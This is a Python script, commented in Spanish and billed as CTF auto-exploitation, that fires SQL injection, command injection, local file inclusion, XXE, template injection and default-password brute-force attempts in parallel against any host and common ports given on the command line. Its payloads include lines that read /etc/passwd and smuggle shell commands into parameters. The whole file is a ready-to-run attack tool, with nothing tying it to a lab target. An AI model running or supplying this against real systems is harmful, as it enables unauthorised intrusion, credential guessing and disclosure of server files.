#!/usr/bin/env python3
"""
Script de auto-explotación para CTFs
Intenta múltiples vectores de ataque automáticamente
"""

import sys
import requests
import socket
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

class AutoPwn:
    def __init__(self, target, port=None):
        self.target = target
        self.port = port
        self.found_vulns = []
        
    def try_sql_injection(self, url):
        """Prueba inyección SQL automática"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--"
        ]
        
        for payload in payloads:
            try:
                # GET
                r = requests.get(f"{url}?id={urllib.parse.quote(payload)}", timeout=3)
                if "error" not in r.text.lower() and r.status_code == 200:
                    if len(r.text) > 500:  # Respuesta significativa
                        print(f"[+] POSIBLE SQLi: {payload}")
                        self.found_vulns.append(('sqli', url, payload))
                
                # POST
                data = {'username': payload, 'password': payload}
                r = requests.post(url, data=data, timeout=3)
                if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
                    print(f"[+] SQLi EXITOSO: {payload}")
                    self.found_vulns.append(('sqli_login', url, payload))
                    return True
            except:
                pass
        return False
    
    def try_command_injection(self, url):
        """Prueba inyección de comandos"""
        payloads = [
            "; ls",
            "| ls",
            "|| ls",
            "& ls",
            "&& ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; id",
            "; whoami"
        ]
        
        for payload in payloads:
            try:
                r = requests.get(f"{url}?cmd={urllib.parse.quote(payload)}", timeout=3)
                if "root:" in r.text or "uid=" in r.text or "bin/" in r.text:
                    print(f"[+] COMMAND INJECTION ENCONTRADO: {payload}")
                    self.found_vulns.append(('cmd_injection', url, payload))
                    return True
            except:
                pass
        return False
    
    def try_lfi(self, url):
        """Prueba Local File Inclusion"""
        payloads = [
            "../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        for payload in payloads:
            try:
                r = requests.get(f"{url}?file={urllib.parse.quote(payload)}", timeout=3)
                if "root:" in r.text or "<?php" in r.text:
                    print(f"[+] LFI ENCONTRADO: {payload}")
                    self.found_vulns.append(('lfi', url, payload))
                    return True
            except:
                pass
        return False
    
    def try_xxe(self, url):
        """Prueba XXE injection"""
        payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
        
        try:
            headers = {'Content-Type': 'application/xml'}
            r = requests.post(url, data=payload, headers=headers, timeout=3)
            if "root:" in r.text:
                print(f"[+] XXE ENCONTRADO!")
                self.found_vulns.append(('xxe', url, payload))
                return True
        except:
            pass
        return False
    
    def try_ssti(self, url):
        """Prueba Server Side Template Injection"""
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__[1].__subclasses__()}}"
        ]
        
        for payload in payloads:
            try:
                r = requests.get(f"{url}?input={urllib.parse.quote(payload)}", timeout=3)
                if "49" in r.text or "config" in r.text.lower():
                    print(f"[+] SSTI ENCONTRADO: {payload}")
                    self.found_vulns.append(('ssti', url, payload))
                    return True
            except:
                pass
        return False
    
    def brute_force_login(self, url):
        """Fuerza bruta rápida en login"""
        users = ['admin', 'root', 'test', 'user', 'guest']
        passwords = ['admin', 'password', '123456', 'test', 'root', 'toor']
        
        for user in users:
            for password in passwords:
                try:
                    data = {'username': user, 'password': password}
                    r = requests.post(url, data=data, timeout=2)
                    if "welcome" in r.text.lower() or "dashboard" in r.text.lower() or "logout" in r.text.lower():
                        print(f"[+] CREDENCIALES ENCONTRADAS: {user}:{password}")
                        self.found_vulns.append(('credentials', url, f"{user}:{password}"))
                        return True
                except:
                    pass
        return False
    
    def scan_all(self):
        """Ejecuta todos los ataques en paralelo"""
        print(f"\n[*] AUTO-PWN INICIADO EN: {self.target}\n")
        
        # Construir URLs objetivo
        protocols = ['http', 'https']
        ports = [80, 443, 8080, 8000, 3000, 5000] if not self.port else [self.port]
        
        urls = []
        for proto in protocols:
            for port in ports:
                urls.append(f"{proto}://{self.target}:{port}")
                urls.append(f"{proto}://{self.target}:{port}/login")
                urls.append(f"{proto}://{self.target}:{port}/admin")
                urls.append(f"{proto}://{self.target}:{port}/index.php")
        
        # Ejecutar ataques en paralelo
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for url in urls:
                futures.append(executor.submit(self.try_sql_injection, url))
                futures.append(executor.submit(self.try_command_injection, url))
                futures.append(executor.submit(self.try_lfi, url))
                futures.append(executor.submit(self.try_xxe, url))
                futures.append(executor.submit(self.try_ssti, url))
                futures.append(executor.submit(self.brute_force_login, url))
            
            # Esperar resultados
            for future in futures:
                try:
                    future.result(timeout=10)
                except:
                    pass
        
        if self.found_vulns:
            print(f"\n[+] VULNERABILIDADES ENCONTRADAS: {len(self.found_vulns)}")
            for vuln_type, url, payload in self.found_vulns:
                print(f"  - {vuln_type}: {url} -> {payload[:50]}...")
        else:
            print("\n[-] No se encontraron vulnerabilidades obvias. Requiere análisis manual.")
        
        return self.found_vulns

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Uso: {sys.argv[0]} <target> [port]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else None
    
    pwn = AutoPwn(target, port)
    pwn.scan_all()